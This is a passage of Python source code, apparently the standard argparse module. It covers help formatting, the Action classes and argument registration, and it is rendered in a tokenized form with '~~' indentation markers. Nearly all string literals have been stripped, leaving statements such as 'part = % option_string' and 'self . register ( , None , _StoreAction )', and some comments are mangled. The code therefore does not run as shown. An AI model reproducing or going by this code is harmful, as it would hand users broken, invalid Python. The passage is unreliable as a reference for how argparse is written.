~~~ part = part [ 1 : - 1 ] \n 
\n 
# add the action string to the list \n 
~~ ~~ parts . append ( part ) \n 
\n 
# produce the first way to invoke the option in brackets \n 
~~ else : \n 
~~~ option_string = action . option_strings [ 0 ] \n 
\n 
\n 
#    -s or --long \n 
if action . nargs == 0 : \n 
~~~ part = % option_string \n 
\n 
# if the Optional takes a value, format is: \n 
#    -s ARGS or --long ARGS \n 
~~ else : \n 
~~~ default = action . dest . upper ( ) \n 
args_string = self . _format_args ( action , default ) \n 
part = % ( option_string , args_string ) \n 
\n 
\n 
~~ if not action . required and action not in group_actions : \n 
~~~ part = % part \n 
\n 
# add the action string to the list \n 
~~ parts . append ( part ) \n 
\n 
# insert things at the necessary indices \n 
~~ ~~ for i in sorted ( inserts , reverse = True ) : \n 
~~~ parts [ i : i ] = [ inserts [ i ] ] \n 
\n 
# join all the action items with spaces \n 
~~ text = . join ( [ item for item in parts if item is not None ] ) \n 
\n 
# clean up separators for mutually exclusive groups \n 
open = \n 
close = \n 
text = _re . sub ( % open , , text ) \n 
text = _re . sub ( % close , , text ) \n 
text = _re . sub ( % ( open , close ) , , text ) \n 
text = _re . sub ( , , text ) \n 
text = text . strip ( ) \n 
\n 
# return the text \n 
return text \n 
\n 
~~ def _format_text ( self , text ) : \n 
~~~ if in text : \n 
~~~ text = text % dict ( prog = self . _prog ) \n 
~~ text_width = self . _width - self . _current_indent \n 
indent = * self . _current_indent \n 
return self . _fill_text ( text , text_width , indent ) + \n 
\n 
~~ def _format_action ( self , action ) : \n 
# determine the required width and the entry label \n 
~~~ help_position = min ( self . _action_max_length + 2 , \n 
self . _max_help_position ) \n 
help_width = self . _width - help_position \n 
action_width = help_position - self . _current_indent - 2 \n 
action_header = self . _format_action_invocation ( action ) \n 
\n 
# ho nelp; start on same line and add a final newline \n 
if not action . help : \n 
~~~ tup = self . _current_indent , , action_header \n 
action_header = % tup \n 
\n 
# short action name; start on the same line and pad two spaces \n 
~~ elif len ( action_header ) <= action_width : \n 
~~~ tup = self . _current_indent , , action_width , action_header \n 
action_header = % tup \n 
indent_first = 0 \n 
\n 
# long action name; start on the next line \n 
~~ else : \n 
~~~ tup = self . _current_indent , , action_header \n 
action_header = % tup \n 
indent_first = help_position \n 
\n 
# collect the pieces of the action help \n 
~~ parts = [ action_header ] \n 
\n 
# if there was help for the action, add lines of help text \n 
if action . help : \n 
~~~ help_text = self . _expand_help ( action ) \n 
help_lines = self . _split_lines ( help_text , help_width ) \n 
parts . append ( % ( indent_first , , help_lines [ 0 ] ) ) \n 
for line in help_lines [ 1 : ] : \n 
~~~ parts . append ( % ( help_position , , line ) ) \n 
\n 
\n 
~~ ~~ elif not action_header . endswith ( ) : \n 
~~~ parts . append ( ) \n 
\n 
# if there are any sub-actions, add their help as well \n 
~~ for subaction in self . _iter_indented_subactions ( action ) : \n 
~~~ parts . append ( self . _format_action ( subaction ) ) \n 
\n 
# return a single string \n 
~~ return self . _join_parts ( parts ) \n 
\n 
~~ def _format_action_invocation ( self , action ) : \n 
~~~ if not action . option_strings : \n 
~~~ metavar , = self . _metavar_formatter ( action , action . dest ) ( 1 ) \n 
return metavar \n 
\n 
~~ else : \n 
~~~ parts = [ ] \n 
\n 
\n 
#    -s, --long \n 
if action . nargs == 0 : \n 
~~~ parts . extend ( action . option_strings ) \n 
\n 
# if the Optional takes a value, format is: \n 
#    -s ARGS, --long ARGS \n 
~~ else : \n 
~~~ default = action . dest . upper ( ) \n 
args_string = self . _format_args ( action , default ) \n 
for option_string in action . option_strings : \n 
~~~ parts . append ( % ( option_string , args_string ) ) \n 
\n 
~~ ~~ return . join ( parts ) \n 
\n 
~~ ~~ def _metavar_formatter ( self , action , default_metavar ) : \n 
~~~ if action . metavar is not None : \n 
~~~ result = action . metavar \n 
~~ elif action . choices is not None : \n 
~~~ choice_strs = [ str ( choice ) for choice in action . choices ] \n 
result = % . join ( choice_strs ) \n 
~~ else : \n 
~~~ result = default_metavar \n 
\n 
~~ def format ( tuple_size ) : \n 
~~~ if isinstance ( result , tuple ) : \n 
~~~ return result \n 
~~ else : \n 
~~~ return ( result , ) * tuple_size \n 
~~ ~~ return format \n 
\n 
~~ def _format_args ( self , action , default_metavar ) : \n 
~~~ get_metavar = self . _metavar_formatter ( action , default_metavar ) \n 
if action . nargs is None : \n 
~~~ result = % get_metavar ( 1 ) \n 
~~ elif action . nargs == OPTIONAL : \n 
~~~ result = % get_metavar ( 1 ) \n 
~~ elif action . nargs == ZERO_OR_MORE : \n 
~~~ result = % get_metavar ( 2 ) \n 
~~ elif action . nargs == ONE_OR_MORE : \n 
~~~ result = % get_metavar ( 2 ) \n 
~~ elif action . nargs == REMAINDER : \n 
~~~ result = \n 
~~ elif action . nargs == PARSER : \n 
~~~ result = % get_metavar ( 1 ) \n 
~~ else : \n 
~~~ formats = [ for _ in range ( action . nargs ) ] \n 
result = . join ( formats ) % get_metavar ( action . nargs ) \n 
~~ return result \n 
\n 
~~ def _expand_help ( self , action ) : \n 
~~~ params = dict ( vars ( action ) , prog = self . _prog ) \n 
for name in list ( params ) : \n 
~~~ if params [ name ] is SUPPRESS : \n 
~~~ del params [ name ] \n 
~~ ~~ for name in list ( params ) : \n 
~~~ if hasattr ( params [ name ] , ) : \n 
~~~ params [ name ] = params [ name ] . __name__ \n 
~~ ~~ if params . get ( ) is not None : \n 
~~~ choices_str = . join ( [ str ( c ) for c in params [ ] ] ) \n 
params [ ] = choices_str \n 
~~ return self . _get_help_string ( action ) % params \n 
\n 
~~ def _iter_indented_subactions ( self , action ) : \n 
~~~ try : \n 
~~~ get_subactions = action . _get_subactions \n 
~~ except AttributeError : \n 
~~~ pass \n 
~~ else : \n 
~~~ self . _indent ( ) \n 
for subaction in get_subactions ( ) : \n 
~~~ yield subaction \n 
~~ self . _dedent ( ) \n 
\n 
~~ ~~ def _split_lines ( self , text , width ) : \n 
~~~ text = self . _whitespace_matcher . sub ( , text ) . strip ( ) \n 
return _textwrap . wrap ( text , width ) \n 
\n 
~~ def _fill_text ( self , text , width , indent ) : \n 
~~~ text = self . _whitespace_matcher . sub ( , text ) . strip ( ) \n 
return _textwrap . fill ( text , width , initial_indent = indent , \n 
subsequent_indent = indent ) \n 
\n 
~~ def _get_help_string ( self , action ) : \n 
~~~ return action . help \n 
\n 
\n 
~~ ~~ class RawDescriptionHelpFormatter ( HelpFormatter ) : \n 
~~~ """Help message formatter which retains any formatting in descriptions.\n\n    Only the name of this class is considered a public API. All the methods\n    provided by the class are considered an implementation detail.\n    """ \n 
\n 
def _fill_text ( self , text , width , indent ) : \n 
~~~ return . join ( [ indent + line for line in text . splitlines ( True ) ] ) \n 
\n 
\n 
~~ ~~ class RawTextHelpFormatter ( RawDescriptionHelpFormatter ) : \n 
~~~ """Help message formatter which retains formatting of all help text.\n\n    Only the name of this class is considered a public API. All the methods\n    provided by the class are considered an implementation detail.\n    """ \n 
\n 
def _split_lines ( self , text , width ) : \n 
~~~ return text . splitlines ( ) \n 
\n 
\n 
~~ ~~ class ArgumentDefaultsHelpFormatter ( HelpFormatter ) : \n 
~~~ """Help message formatter which adds default values to argument help.\n\n    Only the name of this class is considered a public API. All the methods\n    provided by the class are considered an implementation detail.\n    """ \n 
\n 
def _get_help_string ( self , action ) : \n 
~~~ help = action . help \n 
if not in action . help : \n 
~~~ if action . default is not SUPPRESS : \n 
~~~ defaulting_nargs = [ OPTIONAL , ZERO_OR_MORE ] \n 
if action . option_strings or action . nargs in defaulting_nargs : \n 
~~~ help += \n 
~~ ~~ ~~ return help \n 
\n 
\n 
# ===================== \n 
# Options and Arguments \n 
# ===================== \n 
\n 
~~ ~~ def _get_action_name ( argument ) : \n 
~~~ if argument is None : \n 
~~~ return None \n 
~~ elif argument . option_strings : \n 
~~~ return . join ( argument . option_strings ) \n 
~~ elif argument . metavar not in ( None , SUPPRESS ) : \n 
~~~ return argument . metavar \n 
~~ elif argument . dest not in ( None , SUPPRESS ) : \n 
~~~ return argument . dest \n 
~~ else : \n 
~~~ return None \n 
\n 
\n 
~~ ~~ class ArgumentError ( Exception ) : \n 
~~~ """An error from creating or using an argument (optional or positional).\n\n    The string value of this exception is the message, augmented with\n    information about the argument that caused it.\n    """ \n 
\n 
def __init__ ( self , argument , message ) : \n 
~~~ self . argument_name = _get_action_name ( argument ) \n 
self . message = message \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if self . argument_name is None : \n 
~~~ format = \n 
~~ else : \n 
~~~ format = \n 
~~ return format % dict ( message = self . message , \n 
argument_name = self . argument_name ) \n 
\n 
\n 
~~ ~~ class ArgumentTypeError ( Exception ) : \n 
~~~ """An error from trying to convert a command line string to a type.""" \n 
pass \n 
\n 
\n 
# ============== \n 
# Action classes \n 
# ============== \n 
\n 
~~ class Action ( _AttributeHolder ) : \n 
~~~ """Information about how to convert command line strings to Python objects.\n\n    Action objects are used by an ArgumentParser to represent the information\n    needed to parse a single argument from one or more strings from the\n    command line. The keyword arguments to the Action constructor are also\n    all attributes of Action instances.\n\n    Keyword Arguments:\n\n        - option_strings -- A list of command-line option strings which\n            should be associated with this action.\n\n        - dest -- The name of the attribute to hold the created object(s)\n\n        - nargs -- The number of command-line arguments that should be\n            consumed. By default, one argument will be consumed and a single\n            value will be produced.  Other values include:\n                - N (an integer) consumes N arguments (and produces a list)\n                - \'?\' consumes zero or one arguments\n                - \'*\' consumes zero or more arguments (and produces a list)\n                - \'+\' consumes one or more arguments (and produces a list)\n            Note that the difference between the default and nargs=1 is that\n            with the default, a single value will be produced, while with\n            nargs=1, a list containing a single value will be produced.\n\n        - const -- The value to be produced if the option is specified and the\n            option uses an action that takes no values.\n\n        - default -- The value to be produced if the option is not specified.\n\n        - type -- The type which the command-line arguments should be converted\n            to, should be one of \'string\', \'int\', \'float\', \'complex\' or a\n            callable object that accepts a single string argument. If None,\n            \'string\' is assumed.\n\n        - choices -- A container of values that should be allowed. If not None,\n            after a command-line argument has been converted to the appropriate\n            type, an exception will be raised if it is not a member of this\n            collection.\n\n        - required -- True if the action must always be specified at the\n            command line. This is only meaningful for optional command-line\n            arguments.\n\n        - help -- The help string describing the argument.\n\n        - metavar -- The name to be used for the option\'s argument with the\n            help string. If None, the \'dest\' value will be used as the name.\n    """ \n 
\n 
def __init__ ( self , \n 
option_strings , \n 
dest , \n 
nargs = None , \n 
const = None , \n 
default = None , \n 
type = None , \n 
choices = None , \n 
required = False , \n 
help = None , \n 
metavar = None ) : \n 
~~~ self . option_strings = option_strings \n 
self . dest = dest \n 
self . nargs = nargs \n 
self . const = const \n 
self . default = default \n 
self . type = type \n 
self . choices = choices \n 
self . required = required \n 
self . help = help \n 
self . metavar = metavar \n 
\n 
~~ def _get_kwargs ( self ) : \n 
~~~ names = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
return [ ( name , getattr ( self , name ) ) for name in names ] \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ raise NotImplementedError ( _ ( ) ) \n 
\n 
\n 
~~ ~~ class _StoreAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest , \n 
nargs = None , \n 
const = None , \n 
default = None , \n 
type = None , \n 
choices = None , \n 
required = False , \n 
help = None , \n 
metavar = None ) : \n 
~~~ if nargs == 0 : \n 
~~~ raise ValueError ( \n 
\n 
) \n 
~~ if const is not None and nargs != OPTIONAL : \n 
~~~ raise ValueError ( % OPTIONAL ) \n 
~~ super ( _StoreAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
nargs = nargs , \n 
const = const , \n 
default = default , \n 
type = type , \n 
choices = choices , \n 
required = required , \n 
help = help , \n 
metavar = metavar ) \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ setattr ( namespace , self . dest , values ) \n 
\n 
\n 
~~ ~~ class _StoreConstAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest , \n 
const , \n 
default = None , \n 
required = False , \n 
help = None , \n 
metavar = None ) : \n 
~~~ super ( _StoreConstAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
nargs = 0 , \n 
const = const , \n 
default = default , \n 
required = required , \n 
help = help ) \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ setattr ( namespace , self . dest , self . const ) \n 
\n 
\n 
~~ ~~ class _StoreTrueAction ( _StoreConstAction ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest , \n 
default = False , \n 
required = False , \n 
help = None ) : \n 
~~~ super ( _StoreTrueAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
const = True , \n 
default = default , \n 
required = required , \n 
help = help ) \n 
\n 
\n 
~~ ~~ class _StoreFalseAction ( _StoreConstAction ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest , \n 
default = True , \n 
required = False , \n 
help = None ) : \n 
~~~ super ( _StoreFalseAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
const = False , \n 
default = default , \n 
required = required , \n 
help = help ) \n 
\n 
\n 
~~ ~~ class _AppendAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest , \n 
nargs = None , \n 
const = None , \n 
default = None , \n 
type = None , \n 
choices = None , \n 
required = False , \n 
help = None , \n 
metavar = None ) : \n 
~~~ if nargs == 0 : \n 
~~~ raise ValueError ( \n 
\n 
) \n 
~~ if const is not None and nargs != OPTIONAL : \n 
~~~ raise ValueError ( % OPTIONAL ) \n 
~~ super ( _AppendAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
nargs = nargs , \n 
const = const , \n 
default = default , \n 
type = type , \n 
choices = choices , \n 
required = required , \n 
help = help , \n 
metavar = metavar ) \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ items = _copy . copy ( _ensure_value ( namespace , self . dest , [ ] ) ) \n 
items . append ( values ) \n 
setattr ( namespace , self . dest , items ) \n 
\n 
\n 
~~ ~~ class _AppendConstAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest , \n 
const , \n 
default = None , \n 
required = False , \n 
help = None , \n 
metavar = None ) : \n 
~~~ super ( _AppendConstAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
nargs = 0 , \n 
const = const , \n 
default = default , \n 
required = required , \n 
help = help , \n 
metavar = metavar ) \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ items = _copy . copy ( _ensure_value ( namespace , self . dest , [ ] ) ) \n 
items . append ( self . const ) \n 
setattr ( namespace , self . dest , items ) \n 
\n 
\n 
~~ ~~ class _CountAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest , \n 
default = None , \n 
required = False , \n 
help = None ) : \n 
~~~ super ( _CountAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
nargs = 0 , \n 
default = default , \n 
required = required , \n 
help = help ) \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ new_count = _ensure_value ( namespace , self . dest , 0 ) + 1 \n 
setattr ( namespace , self . dest , new_count ) \n 
\n 
\n 
~~ ~~ class _HelpAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
dest = SUPPRESS , \n 
default = SUPPRESS , \n 
help = None ) : \n 
~~~ super ( _HelpAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
default = default , \n 
nargs = 0 , \n 
help = help ) \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ parser . print_help ( ) \n 
parser . exit ( ) \n 
\n 
\n 
~~ ~~ class _VersionAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , \n 
option_strings , \n 
version = None , \n 
dest = SUPPRESS , \n 
default = SUPPRESS , \n 
help = "show program\'s version number and exit" ) : \n 
~~~ super ( _VersionAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
default = default , \n 
nargs = 0 , \n 
help = help ) \n 
self . version = version \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ version = self . version \n 
if version is None : \n 
~~~ version = parser . version \n 
~~ formatter = parser . _get_formatter ( ) \n 
formatter . add_text ( version ) \n 
parser . exit ( message = formatter . format_help ( ) ) \n 
\n 
\n 
~~ ~~ class _SubParsersAction ( Action ) : \n 
\n 
~~~ class _ChoicesPseudoAction ( Action ) : \n 
\n 
~~~ def __init__ ( self , name , help ) : \n 
~~~ sup = super ( _SubParsersAction . _ChoicesPseudoAction , self ) \n 
sup . __init__ ( option_strings = [ ] , dest = name , help = help ) \n 
\n 
~~ ~~ def __init__ ( self , \n 
option_strings , \n 
prog , \n 
parser_class , \n 
dest = SUPPRESS , \n 
help = None , \n 
metavar = None ) : \n 
\n 
~~~ self . _prog_prefix = prog \n 
self . _parser_class = parser_class \n 
self . _name_parser_map = { } \n 
self . _choices_actions = [ ] \n 
\n 
super ( _SubParsersAction , self ) . __init__ ( \n 
option_strings = option_strings , \n 
dest = dest , \n 
nargs = PARSER , \n 
choices = self . _name_parser_map , \n 
help = help , \n 
metavar = metavar ) \n 
\n 
~~ def add_parser ( self , name , ** kwargs ) : \n 
# set prog from the existing prefix \n 
~~~ if kwargs . get ( ) is None : \n 
~~~ kwargs [ ] = % ( self . _prog_prefix , name ) \n 
\n 
# create a pseudo-action to hold the choice help \n 
~~ if in kwargs : \n 
~~~ help = kwargs . pop ( ) \n 
choice_action = self . _ChoicesPseudoAction ( name , help ) \n 
self . _choices_actions . append ( choice_action ) \n 
\n 
# create the parser and add it to the map \n 
~~ parser = self . _parser_class ( ** kwargs ) \n 
self . _name_parser_map [ name ] = parser \n 
return parser \n 
\n 
~~ def _get_subactions ( self ) : \n 
~~~ return self . _choices_actions \n 
\n 
~~ def __call__ ( self , parser , namespace , values , option_string = None ) : \n 
~~~ parser_name = values [ 0 ] \n 
arg_strings = values [ 1 : ] \n 
\n 
# set the parser name if requested \n 
if self . dest is not SUPPRESS : \n 
~~~ setattr ( namespace , self . dest , parser_name ) \n 
\n 
# select the parser \n 
~~ try : \n 
~~~ parser = self . _name_parser_map [ parser_name ] \n 
~~ except KeyError : \n 
~~~ tup = parser_name , . join ( self . _name_parser_map ) \n 
msg = _ ( % tup ) \n 
raise ArgumentError ( self , msg ) \n 
\n 
# parse all the remaining options into the namespace \n 
# store any unrecognized options on the object, so that the top \n 
# level parser can decide what to do with them \n 
~~ namespace , arg_strings = parser . parse_known_args ( arg_strings , namespace ) \n 
if arg_strings : \n 
~~~ vars ( namespace ) . setdefault ( _UNRECOGNIZED_ARGS_ATTR , [ ] ) \n 
getattr ( namespace , _UNRECOGNIZED_ARGS_ATTR ) . extend ( arg_strings ) \n 
\n 
\n 
# ============== \n 
# Type classes \n 
# ============== \n 
\n 
~~ ~~ ~~ class FileType ( object ) : \n 
~~~ """Factory for creating file object types\n\n    Instances of FileType are typically passed as type= arguments to the\n    ArgumentParser add_argument() method.\n\n    Keyword Arguments:\n        - mode -- A string indicating how the file is to be opened. Accepts the\n            same values as the builtin open() function.\n        - bufsize -- The file\'s desired buffer size. Accepts the same values as\n            the builtin open() function.\n    """ \n 
\n 
def __init__ ( self , mode = , bufsize = None ) : \n 
~~~ self . _mode = mode \n 
self . _bufsize = bufsize \n 
\n 
~~ def __call__ ( self , string ) : \n 
# the special argument "-" means sys.std{in,out} \n 
~~~ if string == : \n 
~~~ if in self . _mode : \n 
~~~ return _sys . stdin \n 
~~ elif in self . _mode : \n 
~~~ return _sys . stdout \n 
~~ else : \n 
~~~ msg = _ ( \'argument "-" with mode %r\' % self . _mode ) \n 
raise ValueError ( msg ) \n 
\n 
# all other arguments are used as file names \n 
~~ ~~ if self . _bufsize : \n 
~~~ return open ( string , self . _mode , self . _bufsize ) \n 
~~ else : \n 
~~~ return open ( string , self . _mode ) \n 
\n 
~~ ~~ def __repr__ ( self ) : \n 
~~~ args = [ self . _mode , self . _bufsize ] \n 
args_str = . join ( [ repr ( arg ) for arg in args if arg is not None ] ) \n 
return % ( type ( self ) . __name__ , args_str ) \n 
\n 
# =========================== \n 
# Optional and Positional Parsing \n 
# =========================== \n 
\n 
~~ ~~ class Namespace ( _AttributeHolder ) : \n 
~~~ """Simple object for storing attributes.\n\n    Implements equality by attribute names and values, and provides a simple\n    string representation.\n    """ \n 
\n 
def __init__ ( self , ** kwargs ) : \n 
~~~ for name in kwargs : \n 
~~~ setattr ( self , name , kwargs [ name ] ) \n 
\n 
~~ ~~ __hash__ = None \n 
\n 
def __eq__ ( self , other ) : \n 
~~~ return vars ( self ) == vars ( other ) \n 
\n 
~~ def __ne__ ( self , other ) : \n 
~~~ return not ( self == other ) \n 
\n 
~~ def __contains__ ( self , key ) : \n 
~~~ return key in self . __dict__ \n 
\n 
\n 
~~ ~~ class _ActionsContainer ( object ) : \n 
\n 
~~~ def __init__ ( self , \n 
description , \n 
prefix_chars , \n 
argument_default , \n 
conflict_handler ) : \n 
~~~ super ( _ActionsContainer , self ) . __init__ ( ) \n 
\n 
self . description = description \n 
self . argument_default = argument_default \n 
self . prefix_chars = prefix_chars \n 
self . conflict_handler = conflict_handler \n 
\n 
# set up registries \n 
self . _registries = { } \n 
\n 
# register actions \n 
self . register ( , None , _StoreAction ) \n 
self . register ( , , _StoreAction ) \n 
self . register ( , , _StoreConstAction ) \n 
self . register ( , , _StoreTrueAction ) \n 
self . register ( , , _StoreFalseAction ) \n 
self . register ( , , _AppendAction ) \n 
self . register ( , , _AppendConstAction ) \n 
self . register ( , , _CountAction ) \n 
self . register ( , , _HelpAction ) \n 
self . register ( , , _VersionAction ) \n 
self . register ( , , _SubParsersAction ) \n 
\n 
# raise an exception if the conflict handler is invalid \n 
self . _get_handler ( ) \n 
\n 
# action storage \n 
self . _actions = [ ] \n 
self . _option_string_actions = { } \n 
\n 
# groups \n 
self . _action_groups = [ ] \n 
self . _mutually_exclusive_groups = [ ] \n 
\n 
# defaults storage \n 
self . _defaults = { } \n 
\n 
# determines whether an "option" looks like a negative number \n 
self . _negative_number_matcher = _re . compile ( ) \n 
\n 
# whether or not there are any optionals that look like negative \n 
# numbers -- uses a list so it can be shared and edited \n 
self . _has_negative_number_optionals = [ ] \n 
\n 
# ==================== \n 
# Registration methods \n 
# ==================== \n 
~~ def register ( self , registry_name , value , object ) : \n 
~~~ registry = self . _registries . setdefault ( registry_name , { } ) \n 
registry [ value ] = object \n 
\n 
~~ def _registry_get ( self , registry_name , value , default = None ) : \n 
~~~ return self . _registries [ registry_name ] . get ( value , default ) \n 
\n 
# ================================== \n 
# Namespace default accessor methods \n 
# ================================== \n 
~~ def set_defaults ( self , ** kwargs ) : \n 
~~~ self . _defaults . update ( kwargs ) \n 
\n 
# if these defaults match any existing arguments, replace \n 
# the previous default on the object with the new one \n 
for action in self . _actions : \n 
~~~ if action . dest in kwargs : \n 
~~~ action . default = kwargs [ action . dest ] \n 
\n 
~~ ~~ ~~ def get_default ( self , dest ) : \n 
~~~ for action in self . _actions : \n 
~~~ if action . dest == dest and action . default is not None : \n 
~~~ return action . default \n 
~~ ~~ return self . _defaults . get ( dest , None ) \n 
\n 
\n 
# ======================= \n 
# Adding argument actions \n 
# ======================= \n 
~~ def add_argument ( self , * args , ** kwargs ) : \n 
~~~ """\n        add_argument(dest, ..., name=value, ...)\n        add_argument(option_string, option_string, ..., name=value, ...)\n        """ \n 
\n 
# if no positional args are supplied or only one is supplied and \n 
\n 
# argument \n 
chars = self . prefix_chars \n 
if not args or len ( args ) == 1 and args [ 0 ] [ 0 ] not in chars : \n 
~~~ if args and in kwargs : \n 
~~~ raise ValueError ( ) \n 
~~ kwargs = self . _get_positional_kwargs ( * args , ** kwargs ) \n 
\n 
\n 
~~ else : \n 
~~~ kwargs = self . _get_optional_kwargs ( * args , ** kwargs ) \n 
\n 
# if no default was supplied, use the parser-level default \n 
~~ if not in kwargs : \n 
~~~ dest = kwargs [ ] \n 
if dest in self . _defaults : \n 
~~~ kwargs [ ] = self . _defaults [ dest ] \n 
~~ elif self . argument_default is not None : \n 
~~~ kwargs [ ] = self . argument_default \n 
\n 
# create the action object, and add it to the parser \n 
~~ ~~ action_class = self . _pop_action_class ( kwargs ) \n 
if not _callable ( action_class ) : \n 
~~~ raise ValueError ( \'unknown action "%s"\' % action_class ) \n 
~~ action = action_class ( ** kwargs ) \n 
\n 
# raise an error if the action type is not callable \n 
type_func = self . _registry_get ( , action . type , action . type ) \n 
if not _callable ( type_func ) : \n 
~~~ raise ValueError ( % type_func ) \n 
\n 
~~ return self . _add_action ( action ) \n 
\n 
~~ def add_argument_group ( self , * args , ** kwargs ) : \n 
~~~ group = _ArgumentGroup ( self , * args , ** kwargs ) \n 
self . _action_groups . append ( group ) \n 
return group \n 
\n 
~~ def add_mutually_exclusive_group ( self , ** kwargs ) : \n 
~~~ group = _MutuallyExclusiveGroup ( self , ** kwargs ) \n 
self . _mutually_exclusive_groups . append ( group ) \n 
return group \n 
\n 
~~ def _add_action ( self , action ) : \n 
# resolve any conflicts \n 
~~~ self . _check_conflict ( action ) \n 
\n 
# add to actions list \n 
self . _actions . append ( action ) \n 
action . container = self \n 
\n 
# index the action by any option strings it has \n 
for option_string in action . option_strings : \n 
~~~ self . _option_string_actions [ option_string ] = action \n 
\n 
# set the flag if any option strings look like negative numbers \n 
~~ for option_string in action . option_strings : \n 
~~~ if self . _negative_number_matcher . match ( option_string ) : \n 
~~~ if not self . _has_negative_number_optionals : \n 
~~~ self . _has_negative_number_optionals . append ( True ) \n 
\n 
# return the created action \n 
~~ ~~ ~~ return action \n 
\n 
~~ def _remove_action ( self , action ) : \n 
~~~ self . _actions . remove ( action ) \n 
\n 
~~ def _add_container_actions ( self , container ) : \n 
# collect groups by titles \n 
~~~ title_group_map = { } \n 
for group in self . _action_groups : \n 
~~~ if group . title in title_group_map : \n 
~~~ msg = _ ( ) \n 
raise ValueError ( msg % ( group . title ) ) \n 
~~ title_group_map [ group . title ] = group \n 
\n 
# map each action to its group \n 
~~ group_map = { } \n 
for group in container . _action_groups : \n 
\n 
# if a group with the title exists, use that, otherwise \n 
\n 
~~~ if group . title not in title_group_map : \n 
~~~ title_group_map [ group . title ] = self . add_argument_group ( \n 
title = group . title , \n 
description = group . description , \n 
conflict_handler = group . conflict_handler ) \n 
\n 
# map the actions to their new group \n 
~~ for action in group . _group_actions : \n 
~~~ group_map [ action ] = title_group_map [ group . title ] \n 
\n 
\n 
# NOTE: if add_mutually_exclusive_group ever gains title= and \n 
# description= then this code will need to be expanded as above \n 
~~ ~~ for group in container . _mutually_exclusive_groups : \n 
~~~ mutex_group = self . add_mutually_exclusive_group ( \n 
required = group . required ) \n 
\n 
# map the actions to their new mutex group \n 
for action in group . _group_actions : \n 
~~~ group_map [ action ] = mutex_group \n 
\n 
# add all actions to this container or their group \n 
~~ ~~ for action in container . _actions : \n 
~~~ group_map . get ( action , self ) . _add_action ( action ) \n 
\n 
~~ ~~ def _get_positional_kwargs ( self , dest , ** kwargs ) : \n 
# make sure required is not specified \n 
~~~ if in kwargs : \n 
~~~ msg = _ ( "\'required\' is an invalid argument for positionals" ) \n 
raise TypeError ( msg ) \n 
\n 
# mark positional arguments as required if at least one is \n 
# always required \n 
~~ if kwargs . get ( ) not in [ OPTIONAL , ZERO_OR_MORE ] : \n 
~~~ kwargs [ ] = True \n 
~~ if kwargs . get ( ) == ZERO_OR_MORE and not in kwargs : \n 
~~~ kwargs [ ] = True \n 
\n 
# return the keyword arguments with no option strings \n 
~~ return dict ( kwargs , dest = dest , option_strings = [ ] ) \n 
\n 
~~ def _get_optional_kwargs ( self , * args , ** kwargs ) : \n 
# determine short and long option strings \n 
~~~ option_strings = [ ] \n 
long_option_strings = [ ] \n 
for option_string in args : \n 
\n 
~~~ if not option_string [ 0 ] in self . prefix_chars : \n 
~~~ msg = _ ( \n 
) \n 
tup = option_string , self . prefix_chars \n 
raise ValueError ( msg % tup ) \n 
\n 
# strings starting with two prefix characters are long options \n 
~~ option_strings . append ( option_string ) \n 
if option_string [ 0 ] in self . prefix_chars : \n 
~~~ if len ( option_string ) > 1 : \n 
~~~ if option_string [ 1 ] in self . prefix_chars : \n 
~~~ long_option_strings . append ( option_string ) \n 
\n 
\n 
~~ ~~ ~~ ~~ dest = kwargs . pop ( , None ) \n 
if dest is None : \n 
~~~ if long_option_strings : \n 
~~~ dest_option_string = long_option_strings [ 0 ] \n 
~~ else : \n 
~~~ dest_option_string = option_strings [ 0 ] \n 
~~ dest = dest_option_string . lstrip ( self . prefix_chars ) \n 
if not dest : \n 
~~~ msg = _ ( ) \n 
raise ValueError ( msg % option_string ) \n 
~~ dest = dest . replace ( , ) \n 
\n 
# return the updated keyword arguments \n 
~~ return dict ( kwargs , dest = dest , option_strings = option_strings ) \n 
\n 
~~ def _pop_action_class ( self , kwargs , default = None ) : \n 
~~~ action = kwargs . pop ( , default ) \n 
return self . _registry_get ( , action , action ) \n 
\n 
~~ def _get_handler ( self ) : \n 
# determine function from conflict handler string \n 
~~~ handler_func_name = % self . conflict_handler \n 
try : \n 
~~~ return getattr ( self , handler_func_name ) \n 
~~ except AttributeError : \n 
~~~ msg = _ ( ) \n 
raise ValueError ( msg % self . conflict_handler ) \n 
\n 
~~ ~~ def _check_conflict ( self , action ) : \n 
\n 
# find all options that conflict with this option \n 
~~~ confl_optionals = [ ] \n 
for option_string in action . option_strings : \n 
~~~ if option_string in self . _option_string_actions : \n 
